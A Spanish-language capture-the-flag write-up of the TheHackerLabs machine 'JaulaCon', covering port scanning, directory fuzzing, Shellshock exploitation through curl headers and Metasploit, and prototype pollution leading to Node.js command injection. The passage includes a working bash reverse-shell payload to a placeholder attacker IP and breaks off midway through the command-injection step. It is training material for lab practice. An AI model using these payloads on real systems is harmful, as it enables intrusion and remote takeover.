---
title: "JaulaCon - TheHackerLabs"
date: 2025-03-26
draft: false
slug: "THL-writeup-jaulaCon"
excerpt: "Esta fue una máquina algo complicada. Analizando los escaneos, descubrimos que hay 4 puertos abiertos, de los cuales 3 de estos están mostrando páginas web, el puerto 80 una página normal, el puerto 3333 un login y el puerto 8080 la página por defecto de Apache2, así que analizamos las 3 páginas, con tal de encontrar un vector de ataque. Aplicando Fuzzing en el puerto 8080, descubrimos el directorio cgi-bin y un archivo, por lo que probamos el ataque ShellShock que nos permitió ejecutar comandos. De esta forma obtuvimos una Reverse Shell y nos conectamos a la máquina, pero resulta que entramos dentro de un contenedor, por lo que aún falta entrar en la verdadera máquina. Enumerando el contenedor, encontramos unas credenciales ocultas que nos permiten entrar al login del puerto 3333. Analizando el funcionamiento de esta página, probamos la vulnerabilidad Server Side Prototype Pollution, que nos permitió escalar privilegios y convertirnos en admin de la página. Una vez como admin, probamos inyección de comandos en Node JS, resultando en poder enviar una Reverse Shell a nuestra máquina y al fin conectarnos en la máquina víctima. Revisando los privilegios de nuestro usuario, encontramos que podemos usar un binario como Root, que nos permitirá descomprimir un archivo que contiene una Reverse Shell y así obtener una sesión como Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "Node JS", "Node JS Express", "Web Enumeration", "Fuzzing", "BurpSuite", "ShellShock Attack", "Server Side Prototype Pollution", "Node JS Command Injection", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "curl"
  - "BurpSuite"
  - "tcpdump"
  - "nc"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: auxiliary/scanner/http/apache_mod_cgi_bash_env"
  - "Módulo: exploit/multi/http/apache_mod_cgi_bash_env_exec"
  - "sudo"
  - "msfvenom"
  - "wget"
  - "python3"
links:
  - "https://deephacking.tech/shellshock-attack-web/"
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html?highlight=cgi#curl-reflected-blind-and-out-of-band"
  - "https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html?highlight=proto#prototype-pollution"
  - "https://medium.com/@SpoofIMEI/server-side-prototype-pollution-582fb0ce9a0b"
  - "https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit"
  - "https://tcm-sec.com/prototype-pollution-advanced-web-hacking/"
  - "https://medium.com/@imkarthikeyans/how-to-execute-shell-commands-in-node-js-855c2236f1e"
  - "https://www.marindelafuente.com.ar/ejecucion-de-comandos-shell-con-node-js/"
  - "https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-jaulaCon/jaulaCon.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.200
PING 192.168.1.200 (192.168.1.200) 56(84) bytes of data.
64 bytes from 192.168.1.200: icmp_seq=1 ttl=64 time=1.14 ms
64 bytes from 192.168.1.200: icmp_seq=2 ttl=64 time=0.835 ms
64 bytes from 192.168.1.200: icmp_seq=3 ttl=64 time=1.17 ms
64 bytes from 192.168.1.200: icmp_seq=4 ttl=64 time=0.796 ms

--- 192.168.1.200 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 0.796/0.984/1.168/0.169 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.200 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 11:54 CST
Initiating ARP Ping Scan at 11:54
Scanning 192.168.1.200 [1 port]
Completed ARP Ping Scan at 11:54, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:54
Scanning 192.168.1.200 [65535 ports]
Discovered open port 22/tcp on 192.168.1.200
Discovered open port 80/tcp on 192.168.1.200
Discovered open port 8080/tcp on 192.168.1.200
Discovered open port 3333/tcp on 192.168.1.200
Completed SYN Stealth Scan at 11:55, 42.96s elapsed (65535 total ports)
Nmap scan report for 192.168.1.200
Host is up, received arp-response (0.00064s latency).
Scanned at 2025-03-25 11:54:29 CST for 43s
Not shown: 36705 filtered tcp ports (no-response), 28827 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
3333/tcp open  dec-notes  syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 63
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 43.23 seconds
           Raw packets sent: 118524 (5.215MB) | Rcvd: 28835 (1.153MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Podemos ver 4 puertos abiertos y me da curiosidad el **puerto 3333** y **puerto 8080**, pues me da la impresión que deben esconder algo.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,3333,8080 192.168.1.200 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 11:55 CST
Nmap scan report for 192.168.1.200
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 f9:a8:dc:82:04:97:32:63:99:95:f7:c8:be:dc:b9:62 (ECDSA)
|_  256 00:c9:50:37:b5:21:c1:6e:e6:95:a0:ec:df:3b:cb:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Uoni
3333/tcp open  http    Node.js Express framework

| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /login
8080/tcp open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, en el **puerto 80** parece ser una página normal que vamos a visitar y analizar, en cambio, el **puerto 3333** parece ser un login y el **puerto 8080** parece que solo muestra la página por defecto de **Apache2**.

Vamos a ver las tres para ver que nos podemos encontrar.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura1.png">
</p>

Parece ser una página de venta de relojes.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura2.png">
</p>

Son bastantes tecnologías las que nos está mostrando, pero de momento no veo algo que nos ayude.

Podemos revisar todas las páginas, pero prácticamente es la página principal diseccionada en varias partes:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura3.png">
</p>

De ahí en fuera, no he encontrado nada más, 

Si entramos en la página activa del **puerto 3333**, podemos ver el login que nos reportó el escaneo:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura4.png">
</p>

Como no tenemos credenciales válidas, no podremos hacer nada. Y me da curiosidad que **Wappalizer** no reporta ninguna tecnología.

Y no hay porque revisar la página del **puerto 8080**, ya que solamente es la página por defecto de **Apache2**, esto me hace pensar que aquí hay algo oculto.

Es momento de aplicar **Fuzzing**.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.200:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.200:8080/FUZZ/
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000021:   403        9 L      28 W       282 Ch      "cgi-bin"                                                                                                                    
000000069:   403        9 L      28 W       282 Ch      "icons"                                                                                                                      
000045226:   200        368 L    933 W      10701 Ch    "http://192.168.1.200:8080//"                                                                                              
000095510:   403        9 L      28 W       282 Ch      "server-status"                                                                                                              

Total time: 258.9164
Processed Requests: 220545
Filtered Requests: 220541
Requests/sec.: 851.7998
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.200:8080/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,txt,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.200:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 282]
/.htpasswd.php        (Status: 403) [Size: 282]
/.hta.php             (Status: 403) [Size: 282]
/.hta.html            (Status: 403) [Size: 282]
/.hta.txt             (Status: 403) [Size: 282]
/.htaccess            (Status: 403) [Size: 282]
/.htaccess.sh         (Status: 403) [Size: 282]
/.htaccess.php        (Status: 403) [Size: 282]
/.htaccess.html       (Status: 403) [Size: 282]
/.htpasswd.html       (Status: 403) [Size: 282]
/.htpasswd.txt        (Status: 403) [Size: 282]
/.htpasswd.sh         (Status: 403) [Size: 282]
/.html                (Status: 403) [Size: 282]
/.htaccess.txt        (Status: 403) [Size: 282]
/.hta.sh              (Status: 403) [Size: 282]
/cgi-bin/.html        (Status: 403) [Size: 282]
/cgi-bin/             (Status: 403) [Size: 282]
/index.html           (Status: 200) [Size: 10701]
/index.html           (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 282]
Progress: 23070 / 23075 (99.98%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Encontramos el directorio `/cgi-bin/` lo que es un indicativo de que la página puede ser vulnerable al **ataque ShellShock**.

Nota: curiosamente, **gobuster** no encuentra el directorio **cgi-bin** con los wordlists de **Seclists**, pero sí con el de **dirb** que es el **common.txt**.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando Posibles Archivos Vulnerables a Ataques ShellShock {#shellshock}

Aquí te dejo un blog que explica bastante bien esta vulnerabilidad:
* <a href="https://deephacking.tech/shellshock-attack-web/" target="_blank">Shellshock Attack</a>

Lo principal que tenemos que hacer, es buscar archivos que sean vulnerables ante este ataque, por lo que tenemos que aplicar **Fuzzing** de nuevo, enfocándonos en buscar archivos con extensión **.sh y .cgi**.

Hagámoslo:
```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -z list,sh-cgi http://192.168.1.200:8080/cgi-bin/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.200:8080/cgi-bin/FUZZ.FUZ2Z
Total requests: 2370480

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000795386:   200        6 L      6 W        34 Ch       "agua - cgi"                                                                                                                 

Total time: 0
Processed Requests: 2370480
Filtered Requests: 2370479
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.200:8080/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 100 -x sh,cgi
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.200:8080/cgi-bin/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              cgi,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/agua.cgi             (Status: 200) [Size: 34]
Progress: 3555720 / 3555723 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar las extensiones de archivos especificas a buscar. |

Lo tenemos, encontramos el **archivo agua.cgi**.

Si la visitamos, nos mostrará un mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura5.png">
</p>

Vamos a aplicar pruebas para ver si es vulnerable al **ataque ShellShock**.

### Probando y Explotando Vulnerabilidad ShellShock en Página Web {#shellshock1}

De manera sencilla, podemos utilizar un **script NSE de nmap** que identificar si el archivo que encontramos es vulnerable al **ataque ShellShock**:
```bash
nmap -sV -p 8080 --script http-shellshock --script-args uri=/cgi-bin/agua.cgi 192.168.1.200
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 14:34 CST
Nmap scan report for 192.168.1.200
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.59 ((Debian))

| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://seclists.org/oss-sec/2014/q3/685
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```
Muy bien, si es vulnerable.

De igual forma, podemos aplicar pruebas que vienen en **HackTricks** utilizando la herramienta **curl**:
* <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html?highlight=cgi#curl-reflected-blind-and-out-of-band" target="_blank">HackTricks - CGI: Curl (reflected, blind and out-of-band)</a>

Probemos primero el ataque reflejado: 
```bash
curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://192.168.1.200:8080/cgi-bin/agua.cgi 2>/dev/null| grep 'VULNERABLE'
VULNERABLE TO SHELLSHOCK
```
Funciona, se ve que es vulnerable.

Nota: Aquí le agregué el comando `echo;`, ya que si no no funcionara.

Hagamos otra prueba, aplicando el ataque blind en donde nos tiene que responder en 5 segundos:
```bash
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "sleep 5"' http://192.168.1.200:8080/cgi-bin/agua.cgi
```
Igual funciona, tardo exactamente 5 segundos en terminar la petición.

También podemos ver qué usuario es el que está ejecutando todo esto, que lo más seguro sea el **usuario www-data**:
```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" 'http://192.168.1.200:8080/cgi-bin/agua.cgi'
www-data
```
Excelente, si es ese usuario.

Por último, vamos a mandar una **traza ICMP** a nuestra máquina para ver si es que podemos aplicar una **Reverse Shell**.

Vamos a utilizar la herramienta **tcmpdump** para que captura la traza:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Y aplicando el **ataque ShellShock**, mandamos la traza desde la página con **curl**:
```bash
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "ping -c 2 Tu_IP"' http://192.168.1.200:8080/cgi-bin/agua.cgi
```

Observa la respuesta que obtuvimos:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:12:32.811255 IP 192.168.1.200 > Tu_IP: ICMP echo request, id 1, seq 0, length 64
16:12:32.811275 IP 192.Tu_IP > 192.168.1.200: ICMP echo reply, id 1, seq 0, length 64
16:12:32.814288 IP 192.168.1.200 > TU_IP: ICMP echo request, id 1, seq 256, length 64
16:12:32.814300 IP 192.Tu_IP > 192.168.1.200: ICMP echo reply, id 1, seq 256, length 64
```
Muy bien, ya está más que comprobada que esta vulnerabilidad existe dentro de la página web.

### Obteniendo una Reverse Shell Aplicando Ataque ShellShock {#shellshock2}

Primero, vamos a abrir una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```
Como ya probamos que podemos enviar una **traza ICMP** de la máquina víctima a la nuestra desde la página web, podemos probar enviando una **Reverse Shell** y así poder conectarnos.

Probemos:
```bash
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"' http://192.168.1.200:8080/cgi-bin/agua.cgi
```

Revisa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.200] 48922
bash: no job control in this shell
www-data@10a5dfb83efd:/usr/lib/cgi-bin$ whoami
whoami
www-data
```
Estamos dentro.

Parece ser que es un contenedor, por lo que aún no podremos obtener la flag del usuario:
```bash
www-data@7159efa19ddb:/usr/lib/cgi-bin$ ifconfig
ifconfig
bash: ifconfig: command not found
www-data@7159efa19ddb:/usr/lib/cgi-bin$ ip a
ip a
bash: ip: command not found
```

### Aplicando ShellShock con Metasploit Framework {#shellshock3}

Existen un par de módulos que podemos utilizar para aplicar el **ataque ShellShock**.

El primero es `auxiliary/scanner/http/apache_mod_cgi_bash_env` y nos sirve para probar si una página es vulnerable.

El segundo es `exploit/multi/http/apache_mod_cgi_bash_env_exec` y este es el que aplica el **ataque ShellShock**.

#### Usando Módulo apache_mod_cgi_bash_env para Comprobar que una Página Web es Vulnerable al Ataque ShellShock {#metas1}

Inicia **metasploit framework**:
```bash
msfconsole -q
msf6 >
```

Usemos el módulo `auxiliary/scanner/http/apache_mod_cgi_bash_env` y configuremoslo:
```bash
msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 192.168.1.200
RHOSTS => 192.168.1.200
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/agua.cgi
TARGETURI => /cgi-bin/agua.cgi
```

Ejecuta el módulo:
```bash
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit
[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Bastante sencillo, pero nos confirma que es vulnerable.

#### Usando Módulo apache_mod_cgi_bash_env_exec para Aplicar el Ataque ShellShock {#metas2}

Usemos el módulo:
```bash
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > use exploit/multi/http/apache_mod_cgi_bash_env_exec
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) >
```

Configurémoslo:
```bash
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.100.46
RHOSTS => 192.168.100.46
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/agua.cgi
TARGETURI => /cgi-bin/agua.cgi
```

Ejecuta el módulo:
```bash
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
[*] Started reverse TCP handler on 192.168.100.250:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 192.168.100.46
[*] Meterpreter session 1 opened (192.168.100.250:4444 -> 192.168.100.46:42062) at 2025-03-26 18:08:10 -0600

meterpreter >
```
Y estamos dentro del contenedor.

Esta fue otra forma de aplicar el **ataque ShellShock**.

### Aplicando Server Side Prototype Pollution para Ganar Acceso a la Máquina Víctima {#SSprototypeP}

Buscando por ahí, dentro del contenedor, encontramos unas credenciales en un archivo oculto dentro del directorio `/opt`:
```bash
www-data@7159efa19ddb:/opt$ ls -la
ls -la
total 12
drwxr-xr-x 1 root root 4096 Jun  1  2024 .
drwxr-xr-x 1 root root 4096 Mar 26 00:34 ..
-rw-r--r-- 1 root root   27 Jun  1  2024 .credenciales
www-data@7159efa19ddb:/opt$ cat .credenciales
cat .credenciales
....
```
Parecen ser un usuario y contraseña.

Estos no servirán contra el **servicio SSH**, pero sí contra la página que está activa en el **puerto 3333**:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura6.png">
</p>

#### Analizando Funcionamiento de la Página Web {#SSprototypeP2}

Nos está pidiendo que metamos una URL y luego mandarla, y parece que podemos descargar algo, pero no sé que sea.

Vamos a mandar la misma IP de la máquina y veamos que pasa:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura7.png">
</p>

Curioso.

Ahora, si le damos al botón de descargar, nos dirá el mismo mensaje.

Podemos ver el código fuente y analizarlo:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura8.png">
</p>

Con un poco de ayuda de **ChatGPT**, entendemos que, el botón **Download** nos lleva a la descarga de un archivo llamado **last_url_download.html** que quiero suponer será la URL que metamos. El **script de Javascript** tiene la funcionalidad de enviar una URL ingresada en el formulario, a un endpoint del servidor (siendo `/admin/check_url`) mediante una **petición POST**, el problema es que no hay una validación de la URL que metamos, por lo que cualquier texto lo tomara como válido.

Entonces, cualquier URL o texto que metamos, quedara registrado y luego podremos descargarlo con el botón **Download** o eso es lo que pienso como funciona.

Podemos capturar la **petición POST** con **BurpSuite**:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura9.png">
</p>

Ahí la tenemos, vemos como se envía la data de la URL y también podemos ver que tenemos una cookie de sesión.

Investigando un poco, es posible que la página sea vulnerable a **Server Side Prototype Pollution**, esto porque está ocupando **Node JS Express** y parece que el **parámetro url** no está ocupando ninguna validación, siendo un fallo en el back-end, por lo que es manipulable y podríamos inyectar código malicioso. 

#### Aplicando Server Side Prototype Pollution para Escalar Privilegios y Convertirnos en Admin {#SSprototypeP3}

Primero que nada, ¿qué es **Prototype Pollution**?

| **Prototype Pollution** |
|:-----------:|
| *Es un tipo de vulnerabilidad en JavaScript que permite a un atacante modificar el prototype (prototipo) de objetos globales, como Object.prototype. Esto puede llevar a la ejecución de código malicioso, manipulación de datos y explotación de otras vulnerabilidades en una aplicación web.* |

Aquí te dejo un par de blogs sobre como aplicar esta vulnerabilidad:
* <a href="https://portswigger.net/web-security/prototype-pollution" target="_blank">PortSwigger: What is prototype pollution?</a>
* <a href="https://tcm-sec.com/prototype-pollution-advanced-web-hacking/" target="_blank">Prototype Pollution: Advanced Web Hacking</a>

Ahora, ¿qué es **Server Side Prototype Pollution**?

| **Server Side Prototype Pollution** |
|:-----------:|
| *Server-Side Prototype Pollution (SSPP) es una variante del ataque Prototype Pollution, pero en lugar de ejecutarse en el navegador, afecta el backend de una aplicación. Ocurre cuando un atacante logra modificar el prototipo de objetos en el servidor, lo que puede llevar a la ejecución de código malicioso, evasión de controles de seguridad y, en algunos casos, ejecución remota de código (RCE).* |

Y aquí te dejo un par de blogs sobre como aplicar **Server Side Prototype Pollution**:
* <a href="https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit" target="_blank">Server side prototype pollution, how to detect and exploit</a>
* <a href="https://medium.com/@SpoofIMEI/server-side-prototype-pollution-582fb0ce9a0b" target="_blank">Server-side prototype pollution</a>

En el primer blog, viene un ejemplo de como se aplica esta vulnerabilidad en **Node JS Express**, siendo que primero lanza una **petición GET** con la **cabecera if-none-match**, dando una respuesta negativa. Luego, manda una **petición POST** que infecta el servidor aplicando el **Server Side Prototype Pollution** y luego vuelve a enviar la misma **petición GET**, dando en un resultado positivo.

Esto da a entender que, primero, debemos infectar el servidor y luego podemos mandar la petición que estaba siendo detenida para que ahora sí la apruebe.

En el segundo blog, podemos encontrar al final, una forma de poder escalar privilegios para ser admin.

Vamos a aplicar todo esto que ya aprendimos para escalar privilegios y ser admin. 

Primero infectamos el servidor, modificando la **petición POST** para enviar nuestro payload en **formato JSON** que nos convierte en admin, luego enviamos la petición principal que era la que nos indicaba que no éramos admin, si resulta positivo y nos sale un mensaje distinto, entonces nos habremos convertido en admin.

Hagamoslo como el primer blog:

* Capturamos la **petición POST** y vemos la respuesta negativa de que no somos admin:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura10.png">
</p>

* Modificamos la petición para introducir nuestro payload en **formato JSON** que nos convertirá en admin:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura11.png">
</p>

* Probamos la petición principal y deberíamos obtener una respuesta diferente y positiva:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura12.png">
</p>

Funciono bien, hemos aplicado la vulnerabilidad con éxito.

#### Inyección de Comandos desde Sesión Infectada {#SSprototypeP4}

Como ya vimos, pudimos aplicar **Server Side Prototype Pollution**, por lo que otras vulnerabilidades pueden estar presentes, por ejemplo, la inyección de comandos.

Aquí te dejo un par de blogs acerca de inyección de comandos en **NodeJS**:
* <a href="https://medium.com/@imkarthikeyans/how-to-execute-shell-commands-in-node-js-855c2236f1e" target="_blank">How to execute shell commands in Node js?</a>
* <a href="https://www.marindelafuente.com.ar/ejecucion-de-comandos-shell-con-node-js/" target="_blank">Ejecución de comandos Shell con Node.js</a>

En resumen, existen dos funciones que son vulnerables a ejecución de comandos, siendo `exec()` y `spawn()`.

Es probable que la página esté ocupando alguno de esos dos en su backend (me inclino más por `exec()`), por lo que podemos probar a inyectar comandos. 

Por lo que sabemos, la página utiliza el **parámetro url** para mandar la URL y al resultar válida la URL, parece que permite descargar un archivo. Puede que aquí se esté ejecutando un comando que esté aplicando la creación y/o la descarga del archivo.

Según **ChatGPT**, podemos probar a separar el comando principal con `;`, poner el comando que queremos ejecutar y luego comentar lo demás con `#`, para evitar algún error.

Veamos que pasa si tratamos de ejecutar el **comando whoami**. Todos los comandos los vamos a URL encodear, para evitar algún problema:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura13.png">
</p>

No se refleja nada, sin embargo, parece que funciona el comando, ya que no obtuvimos ningún error. 

Quizá podemos mandarnos la respuesta, así que probemos a mandarnos una **traza ICMP** como hicimos con el **ataque ShellShock**.

Inicia la herramienta **tcpdump** para que capture **paquetes ICMP**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Usemos **ping** y enviemos solo 2 paquetes:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura14.png">
</p>

Observa la respuesta:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
